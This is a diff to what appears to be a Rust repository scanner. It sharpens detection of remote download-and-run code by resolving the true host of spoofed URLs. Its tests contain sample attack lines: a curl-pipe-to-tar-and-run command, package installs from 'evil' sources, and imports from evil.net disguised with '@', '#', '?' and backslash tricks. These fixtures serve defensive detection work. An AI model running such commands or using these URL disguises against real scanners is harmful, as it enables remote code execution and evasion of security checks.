@@ -8,8 +8,8 @@
 
 use crate::git::RepoFile;
 use crate::network::{
-    CALL, DECODE, FileClass, LineCounter, classify, is_binary, is_in_comment, is_local,
-    nearby_lines, surrounding_line,
+    CALL, DECODE, FileClass, LineCounter, classify, host_of, is_binary, is_in_comment, is_local,
+    is_reserved_host, nearby_lines, surrounding_line,
 };
 use crate::report::{At, Kind, Report};
 use crate::text::Untrusted;
@@ -301,7 +301,7 @@ fn add_piped_downloads(file: &RepoFile, report: &mut Report) {
             .any(|flag| matches!(flag, b'c' | b'e' | b'n' | b'p' | b'r'));
         if gets_its_code_elsewhere
             || is_in_comment(contents, found.start(), file.path.raw())
-            || (found.as_bytes().ends_with(b"://") && starts_with_local_host(after))
+            || (found.as_bytes().ends_with(b"://") && points_nowhere_real(after))
         {
             continue;
         }
@@ -320,13 +320,23 @@ fn add_piped_downloads(file: &RepoFile, report: &mut Report) {
     }
 }
 
-/// `import('http://localhost:3000/a.js')` isn't downloading anything from outside.
-fn starts_with_local_host(address: &[u8]) -> bool {
+/// `import('http://localhost:3000/a.js')` isn't downloading anything from outside,
+/// and nobody can be at a reserved name like `cdn.example.com`. The real host is
+/// worked out carefully, since `example.com@evil.net` really means `evil.net`.
+fn points_nowhere_real(address: &[u8]) -> bool {
     let end = address
         .iter()
-        .position(|byte| matches!(byte, b'/' | b':' | b'"' | b'\'' | b'`'))
+        .position(|byte| byte.is_ascii_whitespace() || matches!(byte, b'"' | b'\'' | b'`'))
         .unwrap_or(address.len());
-    std::str::from_utf8(&address[..end]).is_ok_and(is_local)
+    let Ok(address) = std::str::from_utf8(&address[..end]) else {
+        return false;
+    };
+    // These can make an address mean something else to whatever finally reads it.
+    if address.contains(['\\', '$', '%']) {
+        return false;
+    }
+    host_of(&format!("https://{address}"))
+        .is_some_and(|host| is_local(&host) || is_reserved_host(&host))
 }
 
 /// `document.body` and the like aren't the answer to a web request.
@@ -862,7 +872,7 @@ mod tests {
             "npm i github:evil/a",
             "yarn add https://evil.example/a.tgz",
             "curl -s https://evil.example/a.tgz | tar xz && ./a/run",
-            "await import('https://evil.example/a.js')",
+            "await import('https://evil.net/a.js')",
         ] {
             let report = scan_text("a.sh", line.as_bytes());
 
@@ -875,10 +885,28 @@ mod tests {
         for line in [
             "await import('http://localhost:4545/a.js')",
             "await import(\"http://127.0.0.1:3000/a.js\")",
+            "await import('https://cdn.example.com/a.js')",
         ] {
             let report = scan_text("a.js", line.as_bytes());
 
             assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
+        }
+    }
+
+    #[test]
+    fn an_import_made_to_look_reserved_still_counts() {
+        for line in [
+            "await import('https://evilexample.com/a.js')",
+            "await import('https://example.com@evil.net/a.js')",
+            "await import('https://example.com.evil.net/a.js')",
+            "await import('https://evil.net#.example.com')",
+            "await import('https://evil.net?.example.com')",
+            "await import('https://evil.net\\\\@example.com/a.js')",
+            "await import(`https://${host}.example.com/a.js`)",
+        ] {
+            let report = scan_text("a.js", line.as_bytes());
+
+            assert_eq!(report.listed(Kind::DownloadsAndRuns).len(), 1, "{line}");
         }
     }
 
